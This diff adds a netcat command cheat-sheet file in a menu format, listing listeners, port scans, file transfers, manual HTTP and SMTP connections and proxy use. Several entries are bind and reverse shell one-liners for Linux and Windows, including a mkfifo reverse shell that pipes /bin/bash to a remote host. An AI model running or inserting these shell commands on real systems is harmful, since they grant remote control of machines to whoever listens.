@@ -1,0 +1,88 @@
+# Netcat (nc) Command List
+# Format: [\] command [/] description [X] menutitlename
+
+[X] Netcat Command List
+
+[\] nc -lvp 4444
+[/] Start a listener on port 4444 (verbose)
+
+[\] nc -lvnp 4444
+[/] Listener with numeric-only IP/ports
+
+[\] nc <IP> 4444
+[/] Connect to a listening Netcat server
+
+[\] nc -zv <IP> 1-1000
+[/] Scan ports 1–1000 (zero-I/O mode)
+
+[\] nc -zv <IP> 80
+[/] Check if port 80 is open
+
+[\] nc -w 3 <IP> 80
+[/] Set timeout to 3 seconds
+
+[\] echo "hello" | nc <IP> 4444
+[/] Send a simple message to a listener
+
+[\] nc -lvp 4444 > file.txt
+[/] Receive a file
+
+[\] nc <IP> 4444 < file.txt
+[/] Send a file
+
+[\] tar -czf - folder | nc <IP> 4444
+[/] Send a compressed folder over Netcat
+
+[\] nc -lvp 4444 | tar -xzf -
+[/] Receive and extract a folder
+
+[\] nc <IP> 80
+[/] Connect to a web server manually
+
+[\] GET / HTTP/1.1
+[/] Manual HTTP request (after connecting)
+
+[\] nc -lvp 4444 -e /bin/bash
+[/] Bind shell (Linux)
+
+[\] nc -lvp 4444 -e cmd.exe
+[/] Bind shell (Windows)
+
+[\] nc <IP> 4444 -e /bin/bash
+[/] Reverse shell to listener (Linux)
+
+[\] nc <IP> 4444 -e cmd.exe
+[/] Reverse shell to listener (Windows)
+
+[\] mkfifo /tmp/f; nc <IP> 4444 < /tmp/f | /bin/bash > /tmp/f
+[/] Fully POSIX-compliant reverse shell
+
+[\] nc -lvp 53
+[/] Listen on port 53 (DNS-like traffic)
+
+[\] nc -u <IP> 53
+[/] Send UDP packets
+
+[\] nc -uvz <IP> 1-100
+[/] UDP port scan
+
+[\] nc -l -p 1234 -k
+[/] Keep listener open for multiple connections
+
+[\] nc -4 <IP> 4444
+[/] Force IPv4
+
+[\] nc -6 <IP> 4444
+[/] Force IPv6
+
+[\] nc -C <IP> 25
+[/] Connect with CRLF line endings (SMTP)
+
+[\] nc -q 5 <IP> 4444
+[/] Quit after 5 seconds of EOF
+
+[\] nc -X connect -x <proxy:port> <IP> 80
+[/] Use a proxy (SOCKS/HTTP)
+
+[\] nc -h
+[/] Show help menu
